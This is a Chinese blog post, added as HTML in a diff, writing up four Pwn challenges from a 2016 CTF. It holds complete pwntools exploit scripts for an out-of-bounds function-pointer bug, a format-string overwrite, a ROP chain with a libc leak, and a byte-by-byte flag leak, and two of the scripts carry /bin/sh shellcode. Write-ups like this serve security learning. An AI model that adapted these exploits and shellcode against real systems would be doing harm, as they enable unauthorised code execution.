@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="robots" content="index,follow" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta name="author" content="Chu" />
+        <meta name="description" content="Chu 的博客" />
+        <meta name="keywords" content="Chu,网络安全,编程开发" />
+
+        <title>ichunqiu tenCentAp - Pwn - Chu&#39;s BLoG</title>
+
+        
+		
+		
+        <link rel="stylesheet" href="/css/main.5d65992f9b793fc8ef4d51468c16f848fbe23ebfca8a5cd9508abf8cc4389cc7.css" integrity="sha256-XWWZL5t5P8jvTVFGjBb4SPviPr/KilzZUIq/jMQ4nMc=" />
+        <link rel="alternate" href="/index.xml" type="application/atom+xml" title="RSS" />
+    </head>
+
+    <body>
+        <header></header>
+        <main>
+<article>
+    <header>
+        <h1>ichunqiu tenCentAp - Pwn</h1>
+        <div>
+            <time datetime="2016-07-04 21:30:05 +0800 CST">发布时间: 2016-07-04 21:30</time>
+            <time datetime="2016-07-04 21:30:05 +0800 CST">更新时间: 2016-07-04 21:30</time>
+        </div>
+    </header>
+
+    <section>
+    <p>第一次自己做 Pwn，真刺激。bin 和 idb：http://sh3ll.me/images/2016/07/04/ichunqiu.7z</p>
+<h2 id="pwn1">Pwn1</h2>
+<p>在输入操作下标时没有检测是否越界，通过数组越界读获取获取伪造的函数指针执行 shellcode。</p>
+<p><img src="ichunqiu-1.png" alt=""></p>
+<p><img src="ichunqiu-2.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># io = process(&#34;./tc1&#34;)</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;106.75.9.11&#34;</span>, <span style="color:#ae81ff">20000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;4. Divide&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;29&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;[123 110]&#34;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x804a0a4</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="pwn2">Pwn2</h2>
+<p>格式化字符串漏洞。有几个点，开启了 ASLR，所有首先需要泄露出栈的地址；默认读取 16 字节的输入，对于 payload 是不够的，所以首先需要改写掉这个 16；程序设置了 alarm，如果直接重写返回地址的 4 个字节会超时退出，我的办法是分两次写，每次写两个字节；程序是个死循环，所以即使重写了返回地址默认也是无法去执行的，需要改写掉循环标识符使其跳出。</p>
+<p><img src="ichunqiu-3.png" alt=""></p>
+<p><img src="ichunqiu-4.png" alt=""></p>
+<p><img src="ichunqiu-5.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># io = process(&#34;./echo-200&#34;)</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;106.75.9.11&#34;</span>, <span style="color:#ae81ff">20001</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># leak</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%d%d%d%d</span><span style="color:#e6db74"> %p&#34;</span>)
+</span></span><span style="display:flex;"><span>limit_addr <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split()[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xc</span>
+</span></span><span style="display:flex;"><span>while_loop_sign <span style="color:#f92672">=</span> limit_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>
+</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> limit_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x21c</span>
+</span></span><span style="display:flex;"><span>shellcode_addr <span style="color:#f92672">=</span> limit_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;limit addr =&gt; </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hex(limit_addr)))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;while loop sign =&gt; </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hex(while_loop_sign)))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;ret =&gt; </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hex(ret)))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;shellcode addr =&gt; </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hex(shellcode_addr)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># overwrite limit</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> p32(limit_addr) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%600d</span><span style="color:#e6db74"> %7$n&#34;</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># overwrite ret</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> p32(ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;%</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">d %7$n&#34;</span><span style="color:#f92672">.</span>format(u16(p32(shellcode_addr)[:<span style="color:#ae81ff">2</span>]) <span style="color:#f92672">-</span> len(payload) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> p32(ret <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;%</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">d %7$n&#34;</span><span style="color:#f92672">.</span>format(u16(p32(shellcode_addr)[<span style="color:#ae81ff">2</span>:]) <span style="color:#f92672">-</span> len(payload) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># overwrite while loop sign and write shellcode</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> p32(while_loop_sign)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> %7$n&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># gdb.attach(io, &#34;b * 0x08048FB6\nc&#34;)</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="pwn3">Pwn3</h2>
+<p>栈溢出，考点可能是 x64 ROP？机器是 CentOS 的，libc database 中没有找到相应的 libc，直接用的 pwntools 的 leak 泄露出 system 的偏移地址。其实这个完全可以不用泄露的，需要的技术是 return to dl_resolve，可是我还不懂，这两天要去学习下：）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>leak<span style="color:#f92672">.</span>py
+</span></span><span style="display:flex;"><span><span style="color:#f92672">----------</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>qwb3 <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./qwb3&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># io = process(&#34;./qwb3&#34;)</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;106.75.8.230&#34;</span>, <span style="color:#ae81ff">19286</span>)
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x48</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400633</span>
+</span></span><span style="display:flex;"><span>pop_rsi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400631</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># leak</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>(address):
+</span></span><span style="display:flex;"><span>	print <span style="color:#e6db74">&#34;leak </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hex(address))
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> p64(pop_rsi_ret)
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> p64(address)
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> p64(qwb3<span style="color:#f92672">.</span>plt<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;write&#34;</span>))
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">+=</span> p64(qwb3<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;vulnerable_function&#34;</span>))
+</span></span><span style="display:flex;"><span>	io<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># read_addr = u64(io.recv(8))</span>
+</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>	io<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> ret
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;pwn pwn pwn </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>de <span style="color:#f92672">=</span> DynELF(leak, elf<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#34;./qwb3&#34;</span>))
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#f92672">=</span> de<span style="color:#f92672">.</span>lookup(<span style="color:#e6db74">&#34;system&#34;</span>, <span style="color:#e6db74">&#34;libc&#34;</span>)
+</span></span><span style="display:flex;"><span>write_addr <span style="color:#f92672">=</span> de<span style="color:#f92672">.</span>lookup(<span style="color:#e6db74">&#34;write&#34;</span>, <span style="color:#e6db74">&#34;libc&#34;</span>)
+</span></span><span style="display:flex;"><span>print hex(system_addr)
+</span></span><span style="display:flex;"><span>print hex(write_addr)
+</span></span><span style="display:flex;"><span>print hex(write_addr <span style="color:#f92672">-</span> system_addr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exp<span style="color:#f92672">.</span>py
+</span></span><span style="display:flex;"><span><span style="color:#f92672">----------</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>qwb3 <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./qwb3&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># io = process(&#34;./qwb3&#34;)</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;106.75.8.230&#34;</span>, <span style="color:#ae81ff">19286</span>)
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x48</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400633</span>
+</span></span><span style="display:flex;"><span>pop_rsi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400631</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># leak</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;pwn pwn pwn </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rsi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(qwb3<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;write&#34;</span>))
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(qwb3<span style="color:#f92672">.</span>plt<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;write&#34;</span>))
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(qwb3<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;vulnerable_function&#34;</span>))
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>write_addr <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;write =&gt; </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hex(write_addr)))
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#f92672">=</span> write_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x9cc20</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;system =&gt; </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hex(system_addr)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># write /bin/sh</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rsi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0000000000601048</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(qwb3<span style="color:#f92672">.</span>plt<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;read&#34;</span>))
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(qwb3<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;vulnerable_function&#34;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># gdb.attach(io, &#34;b * vulnerable_function+31\nc&#34;)</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># system</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0000000000601048</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(system_addr)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="pwn4">Pwn4</h2>
+<p>就是个一字节的 leak，这道题我觉得难度还不如 Pwn1…</p>
+<p><img src="ichunqiu-6.png" alt=""></p>
+<p>name2 的 buf 空间为 40 字节，scanf 也是读入了 40 字节，也就是说可以去掉尾部的 “\00”，然后 name2 下方相邻的是 flag 的每一个字节，所以每次可以泄露一字节出来。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> sys <span style="color:#f92672">import</span> argv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># io = process(&#34;./cg_leak&#34;)</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;106.75.8.230&#34;</span>, <span style="color:#ae81ff">13349</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>(flag):
+</span></span><span style="display:flex;"><span>    name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;NAME:&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(name)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;again?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(name)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;FLAG: &#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(flag)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Sorry AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;</span>)
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(flag[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>leak(argv[<span style="color:#ae81ff">1</span>])
+</span></span></code></pre></div><p><img src="ichunqiu-7.png" alt=""></p>
+<h2 id="tips">TIPS</h2>
+<p>格式化字符串中利用 “%7$n” 这种 format 很方便，意思是使用第 7 个参数：<a href="http://www.freebuf.com/articles/system/74224.html">格式化字符串的漏洞利用（Part 1）</a></p>
+
+    </section>
+</article>
+</main>
+    </body>
+</html>
